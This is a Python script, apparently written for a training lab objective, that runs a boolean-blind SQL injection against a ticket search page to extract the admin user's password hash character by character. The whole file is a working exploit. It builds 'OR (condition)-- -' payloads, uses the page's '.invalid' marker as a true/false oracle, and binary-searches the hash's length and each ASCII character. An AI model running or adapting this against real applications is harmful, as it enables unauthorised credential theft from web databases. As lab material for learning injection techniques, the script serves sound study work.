#!/usr/bin/env python3
"""
Objective 4 - boolean-blind extraction of the admin password hash.

Approach: binary search on each character's ASCII value.
Instead of trying every possible letter, we ask "is this character's code
greater than N?" and halve the range each time. ~7 questions per character.

Oracle: the search returns a result row only when our injected condition is
true. We detect a returned row by the ".invalid" that appears in every seeded
submitter email - if it's on the page, the condition was TRUE.

Usage:
    python3 obj4_boolean_binary.py --cookie <sessionid>
    python3 obj4_boolean_binary.py --cookie <sessionid> --url http://127.0.0.1:5001
"""

import argparse
import sys
import requests

BASE_TERM = "qqzz404"          # matches no ticket title
SECRET = "(SELECT password FROM auth_user WHERE username='admin')"
ROW_MARKER = ".invalid"        # present only when a ticket row is rendered

session = requests.Session()


def is_true(sql_condition, url):
    """Send OR <condition>; TRUE if a ticket row comes back."""
    payload = f"{BASE_TERM}' OR ({sql_condition})-- -"
    resp = session.get(f"{url}/tickets/search/", params={"q": payload}, timeout=15)
    return ROW_MARKER in resp.text


def find_length(url, cap=200):
    """Binary search the hash length."""
    lo, hi = 0, cap
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if is_true(f"LENGTH({SECRET}) >= {mid}", url):
            lo = mid
        else:
            hi = mid - 1
    return lo


def find_char(pos, url):
    """Binary search one character's ASCII code (printable range)."""
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi) // 2
        # ASCII(...) gives the code of the character at this position
        if is_true(f"ASCII(SUBSTRING({SECRET},{pos},1)) > {mid}", url):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--cookie", required=True, help="value of the sessionid cookie")
    ap.add_argument("--url", default="http://127.0.0.1:5001", help="base URL of the app")
    args = ap.parse_args()

    session.cookies.set("sessionid", args.cookie)

    # quick oracle check before the real run
    if not is_true(f"ASCII(SUBSTRING({SECRET},1,1)) = 112", args.url):  # 'p'
        sys.exit("[!] oracle check failed - is the cookie still valid?")
    print("[+] oracle works (char 1 is 'p')")

    n = find_length(args.url)
    print(f"[+] hash length = {n}")

    out = ""
    for pos in range(1, n + 1):
        out += find_char(pos, args.url)
        print(f"  {pos:>3}/{n}  {out}")

    print("\n[+] admin hash:")
    print(out)


if __name__ == "__main__":
    main()
